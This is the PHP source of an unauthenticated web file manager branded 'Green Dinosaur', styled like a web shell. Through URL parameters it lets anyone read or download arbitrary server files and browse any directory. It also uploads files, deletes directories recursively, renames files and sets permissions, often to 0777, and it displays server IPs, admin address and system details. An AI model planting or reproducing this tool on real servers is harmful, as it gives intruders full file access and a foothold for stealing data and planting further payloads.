<?php
if (isset($_GET['fpath']) && isset($_GET['fopen'])) {
    chdir($_GET['fpath']);
    $file = $_GET['fopen'];
    $filesize = filesize($file); // 파일 크기
    $fp = fopen($file, "r"); // 읽기방식으로 열기

    header("Cache-Control: no-cache, must-revalidate"); // 웹 브라우저가 cache하지 않도록...
    header("Content-type: application/octet-stream"); // 전송하는 content의 타입을 다운로드 받도록...
    header("Accept-Ranges: bytes"); // 전송되는 content의 길이 단위가 bytes임을 알림
    header("Content-Disposition: attachment; filename=\"$file\""); // 다운로드 파일이름 전송
    header("Content-Transfer-Encoding: binary"); // 전송되는 content의 encoding타입이 binary임을 지정
    header("Content-Length: $filesize"); // 전송 파일의 크기 전송

    fpassthru($fp); // 파일의 실제 내용을 전송
    fclose($fp); // 파일 닫기
} else if (isset($_GET['fpath']) && isset($_GET['fread'])) {
    chdir($_GET['fpath']);
    $file = $_GET['fread'];
    $filesize = filesize($file); // 파일 크기
    $fp = fopen($file, "r"); // 읽기방식으로 열기
    $printStr = fread($fp, $filesize);
    fclose($fp);
    print $printStr;
    exit(0);
}

echo "<html>
	<head>
	<style>
		
		html { background: black; }
		#loginbox { font-size:11px; color:green; width:1200px; height:220px; border:1px solid #4C83AF; background-color:#111111; border-radius:5px; -moz-boder-radius:5px; position:relative; top:250px; }
		input { font-size:11px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; }
		loginbox td { border-radius:5px; font-size:11px; }
		.header { size:25px; color:green; }
		h1 { font-family:DigifaceWide; color:green; font-size:200%; }
		h1:hover { text-shadow:0 0 20px #00FFFF, 0 0 100px #00FFFF; }
		.go { height: 50px; width: 50px;float: left; margin-right: 10px; display: none; background-color: #090;}
		.input_big { width:75px; height:30px; background:#191919; color:green; margin:0 4px; border:1px solid #222222; font-size:17px; }
		hr { border:1px solid #222222; }
		#meunlist { width: auto; height: auto; font-size: 12px; font-weight: bold; }
		#meunlist ul { padding-top: 5px; padding-right: 5px; padding-bottom: 7px; padding-left: 2px; text-align:center; list-style-type: none; margin: 0px; }
		#meunlist li { margin: 0px; padding: 0px; display: inline; }
		#meunlist a { font-size: 14px; text-decoration:none; font-weight: bold;color:green;clear: both;width: 100px;margin-right: -6px; padding-top: 3px; padding-right: 15px; padding-bottom: 3px; padding-left: 15px; }
		#meunlist a:hover { background: #333; color:green; }
		.menubar {-moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0;  }
		.menu { font-size:25px; color: }
		.textarea_edit { background-color:#111111; border:1px groove #333; color:green; }
		.textarea_edit:hover { text-decoration:none; border:1px dashed #333; }
		.input_butt {font-size:11px; background:#191919; color:#4C83AF; margin:0 4px; border:1px solid #222222;}
		#result{ -moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:100px;}
		.table{ width:100%; padding:4px 0; color:#888; font-size:15px; }
		#resultx{ -moz-border-radius: 10px; border-radius: 10px; border:1px solid green; padding:4px 8px; line-height:16px; background:#111111; color:#aaa; margin:0 0 8px 0; min-height:50px;}
		.table a{ text-decoration:none; color:green; font-size:15px; }
		.table a:hover{text-decoration:underline;}
		.table td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px; vertical-align:top; }
		.table th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; }
		.table tr:hover{ background:#181818; }
		.tbl{ width:100%; padding:4px 0; color:#888; font-size:15px; text-align:center;  }
		.tbl a{ text-decoration:none; color:green; font-size:15px; vertical-align:middle; }
		.tbl a:hover{text-decoration:underline;}
		.tbl td{ border-bottom:1px solid #222222; padding:0 8px; line-height:24px;  vertical-align:middle; width: 300px; }
		.tbl th{ padding:3px 8px; font-weight:normal; background:#222222; color:#555; vertical-align:middle; }
		.tbl td:hover{ background:#181818; }
		#alert {position: relative;}
		#alert:hover:after {background: hsla(0,0%,0%,.8);border-radius: 3px;color: #f6f6f6;content: 'Click to dismiss';font: bold 12px/30px sans-serif;height: 30px;left: 50%;margin-left: -60px;position: absolute;text-align: center;top: 50px; width: 120px;}
		#alert:hover:before {border-bottom: 10px solid hsla(0,0%,0%,.8);border-left: 10px solid transparent;border-right: 10px solid transparent;content: '';height: 0;left: 50%;margin-left: -10px;position: absolute;top: 40px;width: 0;}
		#alert:target {display: none;}
		.alert_red {animation: alert 1s ease forwards;background-color: #c4453c;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -45px;width: 100%;}
		.alert_green {animation: alert 1s ease forwards;background-color: #43CD80;background-image: linear-gradient(135deg, transparent,transparent 25%, hsla(0,0%,0%,.1) 25%,hsla(0,0%,0%,.1) 50%, transparent 50%,transparent 75%, hsla(0,0%,0%,.1) 75%,hsla(0,0%,0%,.1));background-size: 20px 20px;box-shadow: 0 5px 0 hsla(0,0%,0%,.1);color: #f6f6f6;display: block;font: bold 16px/40px sans-serif;height: 40px;position: absolute;text-align: center;text-decoration: none;top: -45px;width: 100%;}
		@keyframes alert {0% { opacity: 0; }50% { opacity: 1; }100% { top: 0; }}
		#divAlert { background-color:green; color:white;}
		</style>
	</head>
	<body>";

$self = $_SERVER['PHP_SELF'];
$srvr_sof = $_SERVER['SERVER_SOFTWARE'];
$your_ip = $_SERVER['REMOTE_ADDR'];
$srvr_ip = $_SERVER['SERVER_ADDR'];
$admin = $_SERVER['SERVER_ADMIN'];
$host = $_SERVER['SERVER_NAME'];

if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $os = "win";
    $sep = "\\";
    $ox = "Windows";
} else {
    $os = "nix";
    $ox = "Linux";
}

echo "<title>FILE MANAGER v.1.0</title><div id=result>
<table>
    <tbody>
        <tr>
            <td style='border-right:1px solid #104E8B;' width=\"300px;\">
            <div style='text-align:center;'>
                <a href='?' style='text-decoration:none;'><h1>Green Dinosaur</h1></a>
				<font color=blue>File Manager</font>
            </div>
            </td>
            <td>
            <div class=\"header\">
			OS <font color='#666' >:</font>" . $ox . " <font color=\"#666\" >|</font> " . php_uname() . "<br />
			Host: <font color=red><a style='color:red;' href='http://" . $host . "'>" . $host . "</a></font><br />
            Your IP : <font color=red>" . $your_ip . "</font> <font color=\"#666\" >|</font> Server IP : <font color=red>" . $srvr_ip . "</font> <font color=\"#666\" > | </font> Admin <font color=\"#666\" > : </font> <font color=red> {$admin} </font> <br />";
echo "
            </div>
            </td>
        </tr>
    </tbody>
</table></div>";

if (isset($_GET['fpath'])) {
    $fpath = $_GET['fpath'];
    if ($fpath === "")
        $fpath = dirname(__FILE__);
} else {
    $fpath = dirname(__FILE__);
}
chdir($fpath);

function filesizex($size)
{
    if ($size >= 1073741824)
        $size = round(($size / 1073741824), 2) . " GB";
    elseif ($size >= 1048576)
        $size = round(($size / 1048576), 2) . " MB";
    elseif ($size >= 1024)
        $size = round(($size / 1024), 2) . " KB";
    else
        $size .= " B";
    return $size;
}

function DecodePerms($perms)
{
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
        (($perms & 0x0800) ? 's' : 'x') :
        (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
        (($perms & 0x0400) ? 's' : 'x') :
        (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
        (($perms & 0x0200) ? 't' : 'x') :
        (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function dirDetails($directory = ".")
{
    $d = dir($directory);

    $fprops = array();
    $dprops = array();
    $prop = array();
    $chunks = array();
    $fl = 0;
    $dl = 0;
    while (false !== ($entry = $d->read())) {
        if ($entry === ".")
            continue;
        $chunks[0] = DecodePerms(fileperms($entry));
        $chunks[1] = filegroup($entry);
        $chunks[2] = fileowner($entry);
        $chunks[3] = filegroup($entry);
        if (is_file($entry)) {
            $chunks[4] = filesize($entry);
        } else if (is_dir($entry)) {
            $chunks[4] = "";
        }
        $chunks[5] = date("Y/F/D H:i:s", filectime($entry));
        list($prop['perm'], $prop['num'], $prop['user'], $prop['group'], $prop['size'], $prop['time']) = $chunks;
        if (is_file($entry)) {
            $prop['type'] = 'File';
        } else if ($entry === "..") {
            $prop['type'] = 'Upfolder';
        } else if (is_dir($entry)) {
            $prop['type'] = 'Directory';
        }
        $prop['name'] = $entry;
        array_splice($chunks, 0, 8);

        if (is_file($entry)) {
            $fprops[$fl] = $prop;
            $fl += 1;
        } else if (is_dir($entry)) {
            $dprops[$dl] = $prop;
            $dl += 1;
        }
    }
    for ($iii = 0; $iii < $fl; $iii++)
        $dprops[$dl + $iii] = $fprops[$iii];
    $d->close();
    return $dprops;
}

function deleteFiled($file)
{
    if (file_exists($file))
        unlink($file);
}

function download($resource, $fname)
{
    $down = ftp_get($resource, $fname, $fname, FTP_ASCII);
    if ($down) {
        success("The file " . $fname . " downloaded sucessfully");
    } else {
        failed("The file " . $fname . " failed to download");
    }
}

function renamef($fname, $nfname)
{
    if (file_exists($fname))
        rename($fname, $nfname);
}

function rename_ui($path)
{
    $rf_path = $_GET['rename'];
    echo "<div id=result><center><h2>Rename</h2><hr /><p><br /><br /><form method='GET'><input type=hidden name=fpath value='$path'><input type=hidden name='old_name' size='40' value='" . $rf_path . "'>New Name : <input name='new_name' size='40' value='" . basename($rf_path) . "'><input type='submit' value='   >>>   ' /></form></p><br /><br /><hr /><br /><br /></center></div>";
}

function changeperm_ui($path)
{
    $rf_path = $_GET['chperm'];
    echo "<div id=result><center><h2>New Permission</h2><hr /><p><br /><br /><form method='GET'><input type=hidden name=fname value='$rf_path'><input type=hidden name=fpath value='$path'>New Permission($rf_path) : <input name='new_perm' size='40'><input type='submit' value='   >>>   ' /></form></p><br /><br /><hr /><br /><br /></center></div>";

}

function changeperm()
{
    $mode = $_GET['new_perm'];
    $file = $_GET['fname'];
    chmod($file, $mode);

    if ($mode === "r") {
        // Read and write for owner, nothing for everybody else
        chmod($file, 0600);
    } else if ($mode === "w") {
        // Read and write for owner, read for everybody else
        chmod($file, 0644);
    } else if ($mode === "rw") {
        // Everything for owner, read and execute for others
        chmod($file, 0755);
    } else if ($mode === "rx") {
        // Everything for owner, read and execute for owner's group
        chmod($file, 0750);
    } else {
        chmod($file, 0777);
    }
}

function deleteDir($directory, $dir)
{
    chdir($dir . "/" . $directory);
    $d = dir($dir . "/" . $directory);
    while (false !== ($entry = $d->read())) {
        if (($entry === ".") || ($entry === ".."))
            continue;
        if (is_file($entry)) {
            deleteFiled($entry);
        } else if (is_dir($entry)) {
            deleteDir($entry, realpath($dir . "/" . $directory));
            rmdir($entry);
        }
    }
    $d->close();
    chdir($dir);
    rmdir($directory);
}

function createDir($file, $dir)
{
    mkdir($dir);

}

function uploadf($php_path)
{
    global $host;
    $max_size = 1000000000;
    $save_path = realpath($php_path);

    if (empty($_FILES) === false) {
        $file_name = $_FILES['userfile']['name'];
        $tmp_name = $_FILES['userfile']['tmp_name'];
        $file_size = $_FILES['userfile']['size'];
        if ($file_name) {
            if (@is_dir($save_path) === true) {
                if (@is_writable($save_path) === true) {
                    if (@is_uploaded_file($tmp_name) === true) {
                        if ($file_size < $max_size) {
                            $file_path = $save_path . "/" . $file_name;
                            if (file_exists($file_path))
                                unlink($file_path);
                            move_uploaded_file($tmp_name, $file_path);
                        }
                    }
                }
            }
        }
    }
}

?>



<?php
if (isset($_GET['fpath']) && isset($_GET['rename'])) {
    rename_ui($_GET['fpath']);
} else if (isset($_GET['old_name']) && isset($_GET['new_name']) && isset($_GET['fpath'])) {
    renamef($_GET['old_name'], $_GET['new_name']);
} elseif (isset($_GET['delete']) && isset($_GET['fpath'])) {
    deleteFiled($_GET['delete']);
} elseif (isset($_GET['deleteDir']) && isset($_GET['fpath'])) {
    if (file_exists($_GET['deleteDir']))
        deleteDir($_GET['deleteDir'], $_GET['fpath']);
} else if (isset($_GET['chperm']) && isset($_GET['fpath'])) {
    changeperm_ui($_GET['fpath']);
} else if (isset($_GET['fname']) && isset($_GET['fpath']) && isset($_GET['new_perm'])) {
    changeperm();
} else if (isset($_GET['fpath']) && isset($_GET['upload'])) {
    uploadf($_GET['fpath']);
} else if (isset($_GET['fpath']) && isset($_GET['createDir'])) {
    createDir($_GET['fpath'], $_GET['createDir']);
}
ftp_man_bg();
function ftp_man_bg()
{
    global $fpath, $connect, $host;
    $path = !empty($_GET['path']) ? $_GET['path'] : getcwd();
    $dirs = array();
    $fils = array();
    if (is_dir($path)) {
        chdir($path);
        if ($handle = opendir($path)) {
            while (($item = readdir($handle)) !== FALSE) {
                if ($item == ".") {
                    continue;
                }
                if ($item == "..") {
                    continue;
                } else {
                    array_push($fils, $item);
                }
            }
        }
    }
    echo "<div id = resultx><br /><center><form method=GET>To Directory: <input name=fpath value='$fpath' size=65><input type=submit value='   Go   '></form><table class=tbl><tr><td><form enctype='multipart/form-data' method='post' action='?fpath=$fpath&amp;upload=1'>Upload: <input type='file' name='userfile'><input type=submit value=' Upload '></form></td><td><form method=GET><input name=fpath value='$fpath' type=hidden>Create Directory: <input name=createDir size=65><input type=submit value=' Create '></form></td></tr></table></div>";
    echo "<div id=result><table class=table>
    <tr>
    <th width='300px'>Name</th>
	<th width='100px'>Type</th>
    <th width='100px'>Size</th>
    <th width='150px'>Last Modified</th>
	<th width='100px'>Permissions</th>
	<th width='300px'>Actions</th>
    </tr>";
    $property = dirDetails($fpath);
    foreach ($property as $dirnumber => $prop) {
        global $fpath;
        $modified = $prop['time'];
        if ($prop['type'] == 'Upfolder') {
            print "<tr><td><a href='?fpath=" . realpath($fpath . "/" . $prop["name"]) . "'>[ " . $prop["name"] . " ]</a></td><td>" . "" . "</td><td>" . $prop['size'] . "</td><td>" . $modified . "</td><td><a>" . "" . "</a></td><td>" . $prop['size'] . "</td></tr>";
        } else if ($prop['type'] == 'Directory') {
            print "<tr><td><a href='?fpath=" . $fpath . "/" . $prop["name"] . "'>[ " . $prop["name"] . " ]</a></td><td>" . $prop['type'] . "</td><td>" . $prop['size'] . "</td><td>" . $modified . "</td><td><a href='?fpath=$fpath&amp;chperm=" . $prop['name'] . "'>" . $prop['perm'] . "</a></td><td><a href='?fpath=$fpath&amp;rename=" . $prop['name'] . "'>Rename</a> | <a href='?fpath=$fpath&amp;deleteDir=" . $prop['name'] . "'>Delete</a></td></tr>";
        } else {
            print "<tr><td><a href='?fpath=$fpath&amp;fread=" . $prop['name'] . "' target='_blank'>" . $prop['name'] . "</a></td><td>" . $prop['type'] . "</td><td>" . filesizex($prop['size']) . "</td><td>" . $modified . "</td><td><a href='?fpath=$fpath&amp;chperm=" . $prop['name'] . "'>" . $prop['perm'] . "</a></td><td><a href='?fpath=$fpath&amp;fopen=" . $prop['name'] . "'>Download</a> | <a href='?fpath=$fpath&amp;rename=" . $prop['name'] . "'>Rename</a> | <a href='?fpath=$fpath&amp;delete=" . $prop['name'] . "'>Delete</a></td></tr>";
        }
    }
}
?>